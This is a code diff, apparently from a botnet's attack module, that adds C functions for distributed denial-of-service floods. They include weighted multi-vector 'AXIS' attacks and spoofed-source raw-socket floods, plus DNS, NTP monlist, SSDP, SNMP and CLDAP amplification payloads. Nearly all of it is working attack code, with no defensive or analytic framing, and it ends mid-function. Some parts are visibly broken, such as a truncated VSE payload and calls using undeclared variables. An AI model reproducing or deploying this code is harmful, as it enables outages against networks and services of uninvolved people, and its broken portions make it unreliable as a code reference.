+                            struct attack_target *targs, int targs_len,
+                            struct attack_option *opts, int opts_len) {
+    int fd_tcp, fd_icmp, fd_gre, i;
     struct sockaddr_in addr_sin;
-    uint16_t payload_size, dport, sport;
-    uint8_t ttl_values[] = {32, 64, 128, 255};
-    time_t start_time, current_time;
+    uint16_t payload_size, tcp_port, gre_port, sport;
     uint32_t total_packets = 0;
-    uint8_t vector_weights[] = {30, 30, 15, 15, 10}; /* TCP, UDP, ICMP, GRE-IP, GRE-ETH */
-    
-    /* Parse options */
+    /* Weights: TCP 40%, OVH-TCP 30%, ICMP 10%, GRE-IP 10%, GRE-ETH 10% */
+    uint8_t vector_weights[] = {40, 70, 80, 90, 100};
+
     payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
     if (payload_size == 0) payload_size = 1400;
-    
-    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
-    if (dport == 0) dport = rand_next() % 0xFFFF;
-    
+
+    tcp_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_TCP);
+    gre_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_GRE);
+    if (tcp_port == 0) tcp_port = rand_next() % 0xFFFF;
+    if (gre_port == 0) gre_port = rand_next() % 0xFFFF;
+
     sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
     if (sport == 0) sport = rand_next() % 0xFFFF;
-    
-    /* Create raw sockets */
+
     fd_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    fd_gre = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    if (fd_tcp == -1 || fd_icmp == -1 || fd_gre == -1) {
+        if (fd_tcp != -1) close(fd_tcp);
+        if (fd_icmp != -1) close(fd_icmp);
+        if (fd_gre != -1) close(fd_gre);
+        return;
+    }
+
+    int opt = 1;
+    setsockopt(fd_tcp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+    setsockopt(fd_icmp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+    setsockopt(fd_gre, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+
+    for (i = 0; i < targs_len; i++) {
+        addr_sin.sin_family = AF_INET;
+        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
+
+        while (attack_ongoing[0]) {
+            uint8_t vector = rand_next() % 100;
+
+            if (vector < vector_weights[0]) {
+                /* TCP flood (40%) */
+                send_ultimate_tcp(fd_tcp, &addr_sin, payload_size, tcp_port);
+            } else if (vector < vector_weights[1]) {
+                /* OVH-TCP (30%) */
+                attack_ovh_tcp(addr, targs_netmask, targs, targs_len, opts, opts_len);
+            } else if (vector < vector_weights[2]) {
+                /* ICMP (10%) */
+                send_ultimate_icmp(fd_icmp, &addr_sin, payload_size / 4);
+            } else if (vector < vector_weights[3]) {
+                /* GRE IP (10%) */
+                send_ultimate_gre_ip(fd_gre, &addr_sin, payload_size, gre_port);
+            } else {
+                /* GRE Ethernet (10%) */
+                send_ultimate_gre_eth(fd_gre, &addr_sin, payload_size, gre_port);
+            }
+            total_packets++;
+        }
+    }
+
+    close(fd_tcp);
+    close(fd_icmp);
+    close(fd_gre);
+}
+
+/* ============================================================================
+ * AXIS-UDP - UDP-Focused Combined Attack
+ * Includes: UDP, OVH-UDP, DNS-AMP, NTP-AMP, SSDP-AMP, SNMP-AMP, CLDAP-AMP, VSE, ICMP, GRE
+ * ============================================================================ */
+static void attack_axis_udp(ipv4_t addr, uint8_t targs_netmask,
+                            struct attack_target *targs, int targs_len,
+                            struct attack_option *opts, int opts_len) {
+    int fd_udp, fd_icmp, fd_gre, i;
+    struct sockaddr_in addr_sin;
+    uint16_t payload_size, udp_port, gre_port, sport;
+    uint32_t total_packets = 0;
+    /* Weights: UDP 20%, OVH-UDP 15%, DNS-AMP 10%, NTP-AMP 10%, SSDP-AMP 10%, 
+              SNMP-AMP 10%, CLDAP-AMP 5%, VSE 10%, ICMP 5%, GRE-IP 3%, GRE-ETH 2% */
+    uint8_t vector_weights[] = {20, 35, 45, 55, 65, 75, 80, 90, 95, 98, 100};
+
+    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
+    if (payload_size == 0) payload_size = 1400;
+
+    udp_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_UDP);
+    gre_port = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT_GRE);
+    if (udp_port == 0) udp_port = rand_next() % 0xFFFF;
+    if (gre_port == 0) gre_port = rand_next() % 0xFFFF;
+
+    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
+    if (sport == 0) sport = rand_next() % 0xFFFF;
+
     fd_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     fd_icmp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     fd_gre = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    
-    if (fd_tcp == -1 || fd_udp == -1 || fd_icmp == -1 || fd_gre == -1) {
-        if (fd_tcp != -1) close(fd_tcp);
+
+    if (fd_udp == -1 || fd_icmp == -1 || fd_gre == -1) {
         if (fd_udp != -1) close(fd_udp);
         if (fd_icmp != -1) close(fd_icmp);
         if (fd_gre != -1) close(fd_gre);
         return;
     }
-    
+
     int opt = 1;
-    setsockopt(fd_tcp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
     setsockopt(fd_udp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
     setsockopt(fd_icmp, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
     setsockopt(fd_gre, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
-    
-    start_time = time(NULL);
-    
-    /* Main attack loop - all vectors simultaneously */
+
     for (i = 0; i < targs_len; i++) {
         addr_sin.sin_family = AF_INET;
         addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
-        addr_sin.sin_port = htons(dport);
-        
+
         while (attack_ongoing[0]) {
             uint8_t vector = rand_next() % 100;
-            
-            /* Weighted vector selection */
+
             if (vector < vector_weights[0]) {
-                /* TCP flood with OVH bypass (30%) */
-                send_ultimate_tcp(fd_tcp, &addr_sin, payload_size, dport);
-            } else if (vector < vector_weights[0] + vector_weights[1]) {
-                /* UDP flood with DNS headers (30%) */
-                send_ultimate_udp(fd_udp, &addr_sin, payload_size, dport);
-            } else if (vector < vector_weights[0] + vector_weights[1] + vector_weights[2]) {
-                /* ICMP flood (15%) */
+                /* UDP flood (20%) */
+                send_ultimate_udp(fd_udp, &addr_sin, payload_size, udp_port);
+            } else if (vector < vector_weights[1]) {
+                /* OVH-UDP (15%) */
+                attack_ovh_udp(addr, targs_netmask, targs, targs_len, opts, opts_len);
+            } else if (vector < vector_weights[2]) {
+                /* DNS-AMP (10%) */
+                attack_dns_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
+            } else if (vector < vector_weights[3]) {
+                /* NTP-AMP (10%) */
+                attack_ntp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
+            } else if (vector < vector_weights[4]) {
+                /* SSDP-AMP (10%) */
+                attack_ssdp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
+            } else if (vector < vector_weights[5]) {
+                /* SNMP-AMP (10%) */
+                attack_snmp_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
+            } else if (vector < vector_weights[6]) {
+                /* CLDAP-AMP (5%) */
+                attack_cldap_amp(addr, targs_netmask, targs, targs_len, opts, opts_len);
+            } else if (vector < vector_weights[7]) {
+                /* VSE (10%) */
+                send_vse_query(fd_udp, &addr_sin, udp_port);
+            } else if (vector < vector_weights[8]) {
+                /* ICMP (5%) */
                 send_ultimate_icmp(fd_icmp, &addr_sin, payload_size / 4);
-            } else if (vector < vector_weights[0] + vector_weights[1] + vector_weights[2] + vector_weights[3]) {
-                /* GRE IP flood (15%) */
-                send_ultimate_gre_ip(fd_gre, &addr_sin, payload_size, dport);
+            } else if (vector < vector_weights[9]) {
+                /* GRE IP (3%) */
+                send_ultimate_gre_ip(fd_gre, &addr_sin, payload_size, gre_port);
             } else {
-                /* GRE Ethernet flood (10%) */
-                send_ultimate_gre_eth(fd_gre, &addr_sin, payload_size, dport);
+                /* GRE Ethernet (2%) */
+                send_ultimate_gre_eth(fd_gre, &addr_sin, payload_size, gre_port);
             }
-            
             total_packets++;
         }
     }
-    
-    close(fd_tcp);
+
     close(fd_udp);
     close(fd_icmp);
     close(fd_gre);
+}
+
+/* ============================================================================
+ * VSE Source Engine Query Attack (NEW for AXIS-L4)
+ * ============================================================================ */
+static void send_vse_query(int fd, struct sockaddr_in *addr_sin, uint16_t dport) {
+    char pktbuf[1024];
+    struct iphdr *iph = (struct iphdr *)pktbuf;
+    struct udphdr *udph;
+    char *payload;
+    int pktsize = sizeof(struct iphdr) + sizeof(struct udphdr) + 21;
+    
+    util_zero(pktbuf, pktsize);
+    
+    /* IP header */
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tot_len = htons(pktsize);
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+    iph->daddr = addr_sin->sin_addr.s_addr;
+    iph->ttl = 64;
+    iph->id = rand_next();
+    
+    /* UDP header */
+    udph = (struct udphdr *)(iph + 1);
+    udph->source = htons(rand_next() % 0xFFFF);
+    udph->dest = htons(dport);
+    udph->len = htons(sizeof(struct udphdr) + 21);
+    
+    /* VSE payload: \xFF\xFF\xFF\xFF\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00 */
+    payload = (char *)(udph + 1);
+    payload[0] = 0xFF;
+    payload[1] = 0xFF;
+    payload[2] = 0xFF;
+    payload[3] = 0xFF;
+    payload[4] = 'T';
+    payload[5] = 'S';
+    payload[6] = 'o';
+    payload[7] = 'u';
+    payload[8] = 'r';
+    payload[9] = 'c';
+    payload[10] = 'e';
+    payload[11] = ' ';
+    payload[12] = 'E';
+    payload[13] = 'n';
+    payload[14] = 'g';
+    payload[15] = 'i';
+    payload[16] = 'n';
+    payload[17] = 'e';
+    payload[18] = ' ';
+    payload[19] = 'Q';
+    payload[20] = 'u';
+    
+    iph->check = 0;
+    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+    udph->check = 0;
+    
+    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
+}
+
+/* ============================================================================
+ * DNS Query Flood (NEW for AXIS-L4)
+ * ============================================================================ */
+static void send_dns_query(int fd, struct sockaddr_in *addr_sin, uint16_t dport) {
+    char pktbuf[512];
+    struct iphdr *iph = (struct iphdr *)pktbuf;
+    struct udphdr *udph;
+    char *dns_query;
+    int pktsize = sizeof(struct iphdr) + sizeof(struct udphdr) + 44;
+    
+    util_zero(pktbuf, pktsize);
+    
+    /* IP header */
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tot_len = htons(pktsize);
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+    iph->daddr = addr_sin->sin_addr.s_addr;
+    iph->ttl = 64;
+    iph->id = rand_next();
+    
+    /* UDP header */
+    udph = (struct udphdr *)(iph + 1);
+    udph->source = htons(rand_next() % 0xFFFF);
+    udph->dest = htons(dport);
+    udph->len = htons(sizeof(struct udphdr) + 44);
+    
+    /* DNS query for google.com ANY */
+    dns_query = (char *)(udph + 1);
+    dns_query[0] = (rand_next() >> 8) & 0xFF;  /* Transaction ID */
+    dns_query[1] = rand_next() & 0xFF;
+    dns_query[2] = 0x01;  /* Flags: Standard query */
+    dns_query[3] = 0x00;
+    dns_query[4] = 0x00;  /* Questions: 1 */
+    dns_query[5] = 0x01;
+    dns_query[6] = 0x00;  /* Answer RRs: 0 */
+    dns_query[7] = 0x00;
+    dns_query[8] = 0x00;  /* Authority RRs: 0 */
+    dns_query[9] = 0x00;
+    dns_query[10] = 0x00; /* Additional RRs: 0 */
+    dns_query[11] = 0x00;
+    dns_query[12] = 0x06; /* google.com */
+    dns_query[13] = 'g';
+    dns_query[14] = 'o';
+    dns_query[15] = 'o';
+    dns_query[16] = 'g';
+    dns_query[17] = 'l';
+    dns_query[18] = 'e';
+    dns_query[19] = 0x03;
+    dns_query[20] = 'c';
+    dns_query[21] = 'o';
+    dns_query[22] = 'm';
+    dns_query[23] = 0x00;
+    dns_query[24] = 0x00; /* Type: ANY */
+    dns_query[25] = 0xFF;
+    dns_query[26] = 0x00; /* Class: IN */
+    dns_query[27] = 0x01;
+    
+    iph->check = 0;
+    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+    udph->check = 0;
+    
+    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
+}
+
+/* ============================================================================
+ * CLDAP Query Flood (NEW for AXIS-L4)
+ * ============================================================================ */
+static void send_cldap_query(int fd, struct sockaddr_in *addr_sin, uint16_t dport) {
+    char pktbuf[256];
+    struct iphdr *iph = (struct iphdr *)pktbuf;
+    struct udphdr *udph;
+    char *cldap_query;
+    int pktsize = sizeof(struct iphdr) + sizeof(struct udphdr) + 65;
+    
+    util_zero(pktbuf, pktsize);
+    
+    /* IP header */
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tot_len = htons(pktsize);
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+    iph->daddr = addr_sin->sin_addr.s_addr;
+    iph->ttl = 64;
+    iph->id = rand_next();
+    
+    /* UDP header */
+    udph = (struct udphdr *)(iph + 1);
+    udph->source = htons(rand_next() % 0xFFFF);
+    udph->dest = htons(dport);
+    udph->len = htons(sizeof(struct udphdr) + 65);
+    
+    /* CLDAP netlogon query */
+    cldap_query = (char *)(udph + 1);
+    cldap_query[0] = 0x30;
+    cldap_query[1] = 0x3f;
+    cldap_query[2] = 0x02;
+    cldap_query[3] = 0x01;
+    cldap_query[4] = 0x63;
+    cldap_query[5] = 0x63;
+    cldap_query[6] = 0x3a;
+    cldap_query[7] = 0x04;
+    cldap_query[8] = 0x00;
+    cldap_query[9] = 0xa1;
+    cldap_query[10] = 0x00;
+    cldap_query[11] = 0xa2;
+    cldap_query[12] = 0x00;
+    cldap_query[13] = 0x30;
+    cldap_query[14] = 0x00;
+    cldap_query[15] = 0x30;
+    cldap_query[16] = 0x29;
+    cldap_query[17] = 0x04;
+    cldap_query[18] = 0x00;
+    cldap_query[19] = 0x30;
+    cldap_query[20] = 0x23;
+    cldap_query[21] = 0x04;
+    cldap_query[22] = 0x00;
+    cldap_query[23] = 0x04;
+    cldap_query[24] = 0x00;
+    cldap_query[25] = 0x04;
+    cldap_query[26] = 0x00;
+    cldap_query[27] = 0x04;
+    cldap_query[28] = 0x00;
+    cldap_query[29] = 0x04;
+    cldap_query[30] = 0x00;
+    cldap_query[31] = 0x04;
+    cldap_query[32] = 0x00;
+    cldap_query[33] = 0x04;
+    cldap_query[34] = 0x00;
+    cldap_query[35] = 0x04;
+    cldap_query[36] = 0x00;
+    cldap_query[37] = 0x04;
+    cldap_query[38] = 0x00;
+    cldap_query[39] = 0x04;
+    cldap_query[40] = 0x00;
+    cldap_query[41] = 0x04;
+    cldap_query[42] = 0x00;
+    cldap_query[43] = 0x04;
+    cldap_query[44] = 0x00;
+    cldap_query[45] = 0x04;
+    cldap_query[46] = 0x00;
+    cldap_query[47] = 0x04;
+    cldap_query[48] = 0x00;
+    cldap_query[49] = 0x04;
+    cldap_query[50] = 0x00;
+    cldap_query[51] = 0x04;
+    cldap_query[52] = 0x00;
+    cldap_query[53] = 0x04;
+    cldap_query[54] = 0x00;
+    cldap_query[55] = 0x04;
+    cldap_query[56] = 0x00;
+    cldap_query[57] = 0x04;
+    cldap_query[58] = 0x00;
+    cldap_query[59] = 0x04;
+    cldap_query[60] = 0x00;
+    cldap_query[61] = 0x04;
+    cldap_query[62] = 0x00;
+    cldap_query[63] = 0x04;
+    cldap_query[64] = 0x00;
+    
+    iph->check = 0;
+    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+    udph->check = 0;
+    
+    sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
 }
 
 /* ============================================================================
@@ -1824,5 +2521,326 @@ static void attack_gre_eth(ipv4_t addr, uint8_t targs_netmask, struct attack_tar
     }
 
     free(pktbuf);
+    close(fd);
+}
+
+/* ============================================================================
+ * AMPLIFICATION ATTACKS
+ * ============================================================================ */
+
+/* DNS Amplification Payload - ANY query for google.com */
+static char dns_amp_payload[] = {
+    0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d, 0x00,
+    0x00, 0xff, 0x00, 0x01
+};
+
+static void attack_dns_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int fd, i;
+    struct sockaddr_in addr_sin;
+    uint16_t payload_size = sizeof(dns_amp_payload);
+    char *packet;
+    int packet_size;
+    struct iphdr *iph;
+    struct udphdr *udph;
+    uint16_t sport;
+
+    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
+    if (sport == 0) sport = rand_next() % 0xFFFF;
+
+    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
+    packet = malloc(packet_size);
+    util_zero(packet, packet_size);
+
+    iph = (struct iphdr *)packet;
+    udph = (struct udphdr *)(iph + 1);
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tot_len = htons(packet_size);
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+
+    udph->source = htons(sport);
+    udph->dest = htons(53);
+    udph->len = htons(sizeof(struct udphdr) + payload_size);
+
+    memcpy((char *)(udph + 1), dns_amp_payload, payload_size);
+
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) { free(packet); return; }
+
+    int opt = 1;
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+    addr_sin.sin_family = AF_INET;
+
+    for (i = 0; i < targs_len; i++) {
+        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        iph->daddr = addr_sin.sin_addr.s_addr;
+
+        while (attack_ongoing[0]) {
+            dns_amp_payload[0] = rand_next() & 0xFF;
+            dns_amp_payload[1] = (rand_next() >> 8) & 0xFF;
+            iph->id = rand_next();
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+            udph->check = 0;
+            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
+            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        }
+    }
+    free(packet);
+    close(fd);
+}
+
+/* NTP Amplification Payload - monlist command */
+static char ntp_amp_payload[] = {
+    0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+static void attack_ntp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int fd, i;
+    struct sockaddr_in addr_sin;
+    uint16_t payload_size = sizeof(ntp_amp_payload);
+    char *packet;
+    int packet_size;
+    struct iphdr *iph;
+    struct udphdr *udph;
+    uint16_t sport;
+
+    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
+    if (sport == 0) sport = (rand_next() % 0xFFFF) & 0xFF00;
+
+    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
+    packet = malloc(packet_size);
+    util_zero(packet, packet_size);
+
+    iph = (struct iphdr *)packet;
+    udph = (struct udphdr *)(iph + 1);
+
+    iph->ihl = 5; iph->version = 4;
+    iph->tot_len = htons(packet_size);
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+
+    udph->source = htons(sport);
+    udph->dest = htons(123);
+    udph->len = htons(sizeof(struct udphdr) + payload_size);
+    memcpy((char *)(udph + 1), ntp_amp_payload, payload_size);
+
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) { free(packet); return; }
+    int opt = 1;
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+    addr_sin.sin_family = AF_INET;
+
+    for (i = 0; i < targs_len; i++) {
+        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        iph->daddr = addr_sin.sin_addr.s_addr;
+        while (attack_ongoing[0]) {
+            iph->id = rand_next();
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+            udph->check = 0;
+            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
+            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        }
+    }
+    free(packet);
+    close(fd);
+}
+
+/* SSDP Amplification Payload - M-SEARCH */
+static char ssdp_amp_payload[] = {
+    0x4d, 0x2d, 0x53, 0x45, 0x41, 0x52, 0x43, 0x48, 0x20, 0x2a, 0x20, 0x48,
+    0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x48, 0x4f, 0x53,
+    0x54, 0x3a, 0x20, 0x32, 0x33, 0x39, 0x2e, 0x32, 0x35, 0x35, 0x2e, 0x32,
+    0x35, 0x35, 0x2e, 0x32, 0x35, 0x30, 0x3a, 0x31, 0x39, 0x30, 0x30, 0x0d,
+    0x0a, 0x4d, 0x41, 0x4e, 0x3a, 0x20, 0x22, 0x73, 0x73, 0x64, 0x70, 0x3a,
+    0x64, 0x69, 0x73, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x22, 0x0d, 0x0a, 0x4d,
+    0x58, 0x3a, 0x33, 0x0d, 0x0a, 0x53, 0x54, 0x3a, 0x20, 0x75, 0x72, 0x6e,
+    0x3a, 0x73, 0x63, 0x68, 0x65, 0x6d, 0x61, 0x73, 0x2d, 0x75, 0x70, 0x6e,
+    0x70, 0x2d, 0x6f, 0x72, 0x67, 0x3a, 0x64, 0x65, 0x76, 0x69, 0x63, 0x65,
+    0x3a, 0x61, 0x6c, 0x6c, 0x0d, 0x0a, 0x0d, 0x0a
+};
+
+static void attack_ssdp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int fd, i;
+    struct sockaddr_in addr_sin;
+    uint16_t payload_size = sizeof(ssdp_amp_payload);
+    char *packet;
+    int packet_size;
+    struct iphdr *iph;
+    struct udphdr *udph;
+    uint16_t sport;
+
+    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
+    if (sport == 0) sport = rand_next() % 0xFFFF;
+
+    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
+    packet = malloc(packet_size);
+    util_zero(packet, packet_size);
+
+    iph = (struct iphdr *)packet;
+    udph = (struct udphdr *)(iph + 1);
+    iph->ihl = 5; iph->version = 4;
+    iph->tot_len = htons(packet_size);
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+
+    udph->source = htons(sport);
+    udph->dest = htons(1900);
+    udph->len = htons(sizeof(struct udphdr) + payload_size);
+    memcpy((char *)(udph + 1), ssdp_amp_payload, payload_size);
+
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) { free(packet); return; }
+    int opt = 1;
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+    addr_sin.sin_family = AF_INET;
+
+    for (i = 0; i < targs_len; i++) {
+        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        iph->daddr = addr_sin.sin_addr.s_addr;
+        while (attack_ongoing[0]) {
+            iph->id = rand_next();
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+            udph->check = 0;
+            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
+            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        }
+    }
+    free(packet);
+    close(fd);
+}
+
+/* SNMP Amplification Payload - GETBULK */
+static char snmp_amp_payload[] = {
+    0x30, 0x31, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69,
+    0x63, 0xa7, 0x24, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00,
+    0x02, 0x01, 0x00, 0x30, 0x16, 0x30, 0x14, 0x06, 0x00, 0x06, 0x0e, 0x2b,
+    0x06, 0x01, 0x04, 0x01, 0x92, 0x2b, 0x01, 0x01, 0x01, 0x01, 0x80, 0x00,
+    0x00, 0x00, 0x00, 0xa0, 0x00, 0x00, 0x00, 0x00
+};
+
+static void attack_snmp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int fd, i;
+    struct sockaddr_in addr_sin;
+    uint16_t payload_size = sizeof(snmp_amp_payload);
+    char *packet;
+    int packet_size;
+    struct iphdr *iph;
+    struct udphdr *udph;
+    uint16_t sport;
+
+    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
+    if (sport == 0) sport = rand_next() % 0xFFFF;
+
+    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
+    packet = malloc(packet_size);
+    util_zero(packet, packet_size);
+
+    iph = (struct iphdr *)packet;
+    udph = (struct udphdr *)(iph + 1);
+    iph->ihl = 5; iph->version = 4;
+    iph->tot_len = htons(packet_size);
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+
+    udph->source = htons(sport);
+    udph->dest = htons(161);
+    udph->len = htons(sizeof(struct udphdr) + payload_size);
+    memcpy((char *)(udph + 1), snmp_amp_payload, payload_size);
+
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) { free(packet); return; }
+    int opt = 1;
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+    addr_sin.sin_family = AF_INET;
+
+    for (i = 0; i < targs_len; i++) {
+        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        iph->daddr = addr_sin.sin_addr.s_addr;
+        while (attack_ongoing[0]) {
+            iph->id = rand_next();
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+            udph->check = 0;
+            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
+            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        }
+    }
+    free(packet);
+    close(fd);
+}
+
+/* CLDAP Amplification Payload - LDAP search */
+static char cldap_amp_payload[] = {
+    0x30, 0x3f, 0x02, 0x01, 0x63, 0x63, 0x3a, 0x04, 0x00, 0xa1, 0x00, 0xa2,
+    0x00, 0x30, 0x00, 0x30, 0x29, 0x04, 0x00, 0x30, 0x23, 0x04, 0x00, 0x04,
+    0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04,
+    0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04,
+    0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00
+};
+
+static void attack_cldap_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int fd, i;
+    struct sockaddr_in addr_sin;
+    uint16_t payload_size = sizeof(cldap_amp_payload);
+    char *packet;
+    int packet_size;
+    struct iphdr *iph;
+    struct udphdr *udph;
+    uint16_t sport;
+
+    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
+    if (sport == 0) sport = rand_next() % 0xFFFF;
+
+    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
+    packet = malloc(packet_size);
+    util_zero(packet, packet_size);
+
+    iph = (struct iphdr *)packet;
+    udph = (struct udphdr *)(iph + 1);
+    iph->ihl = 5; iph->version = 4;
+    iph->tot_len = htons(packet_size);
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = rand_next();
+
+    udph->source = htons(sport);
+    udph->dest = htons(389);
+    udph->len = htons(sizeof(struct udphdr) + payload_size);
+    memcpy((char *)(udph + 1), cldap_amp_payload, payload_size);
+
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) { free(packet); return; }
+    int opt = 1;
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
+    addr_sin.sin_family = AF_INET;
+
+    for (i = 0; i < targs_len; i++) {
